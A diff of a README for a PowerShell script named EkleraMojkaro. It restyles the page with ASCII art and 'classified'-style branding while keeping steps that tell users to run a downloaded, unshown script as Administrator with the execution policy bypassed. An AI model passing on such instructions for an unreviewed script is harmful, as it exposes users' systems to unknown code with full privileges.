@@ -1,21 +1,36 @@
-# EkleraMojkaro Script Configuration
+# 🔮 EkleraMojkaro Script [ Pro Edition ]
 
-This repository contains configuration files for the script modification tool.
+```ascii
+███████╗██╗  ██╗██╗     ███████╗██████╗  █████╗ 
+██╔════╝██║ ██╔╝██║     ██╔════╝██╔══██╗██╔══██╗
+█████╗  █████╔╝ ██║     █████╗  ██████╔╝███████║
+██╔══╝  ██╔═██╗ ██║     ██╔══╝  ██╔══██╗██╔══██║
+███████╗██║  ██╗███████╗███████╗██║  ██║██║  ██║
+╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
+```
 
-## Download
+![Version](https://img.shields.io/badge/Version-1.0-blue.svg?style=for-the-badge)
+![Platform](https://img.shields.io/badge/Platform-Windows-darkblue.svg?style=for-the-badge)
+![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-purple.svg?style=for-the-badge)
+
+> 🔥 **Elite Configuration Tool for Power Users**
+
+## ⚡ Quick Download
 
 [![Download Script](https://img.shields.io/github/v1/release/InfofriyendsTechnology/EkleraMojkaro?label=Download&style=for-the-badge)](https://github.com/InfofriyendsTechnology/EkleraMojkaro/blob/master/Y.eklera.ps1)
 
 You can download the script directly from our GitHub repository by clicking the download button above.
 
-## Installation Instructions
+## 🚀 Installation Matrix
 
-1. Download the Script
-   - Click the download button above to get `Y.eklera.ps1`
-   - Or use this direct link: [`Y.eklera.ps1`](https://github.com/InfofriyendsTechnology/EkleraMojkaro/blob/master/Y.eklera.ps1)
-   - Save it in your Downloads folder
+### 📥 Phase 1: Acquisition
+```
+⚠️ CLASSIFIED LEVEL: AUTHORIZED ACCESS ONLY
+```
+- 🔐 Secure the script: [`Y.eklera.ps1`](https://github.com/InfofriyendsTechnology/EkleraMojkaro/blob/master/Y.eklera.ps1)
+- 📁 Deploy to local matrix: `%UserProfile%\Downloads\`
 
-2. Running the Script
+### ⚡ Phase 2: Execution
    - Open PowerShell as Administrator
    - Navigate to your Downloads folder and run the script using:
    ```powershell
@@ -23,7 +38,26 @@ You can download the script directly from our GitHub repository by clicking the 
    powershell -ExecutionPolicy Bypass -File .\Y.eklera.ps1
    ```
 
-## Important Notes
-- The script must be run with administrative privileges
-- Make sure to set the execution policy to Bypass when running the script
-- Keep the script in the Downloads folder for proper execution
+## ⚠️ Critical Protocol
+
+```ascii
+┌──────────────────────────────────────────┐
+│  🛡️ SECURITY CLEARANCE REQUIRED          │
+│  💻 ADMINISTRATIVE ACCESS MANDATORY       │
+│  🔒 EXECUTION POLICY: BYPASS             │
+└──────────────────────────────────────────┘
+```
+
+### 🔒 Security Protocols
+- `[ADMIN]` Elevated privileges required
+- `[POLICY]` Execution policy override engaged
+- `[LOCATION]` Maintain deployment in Downloads sector
+
+### 💡 Pro Tips
+- Run regular system diagnostics before execution
+- Maintain secure backup protocols
+- Monitor system response during runtime
+
+```ascii
+[END OF SECURE TRANSMISSION]
+```
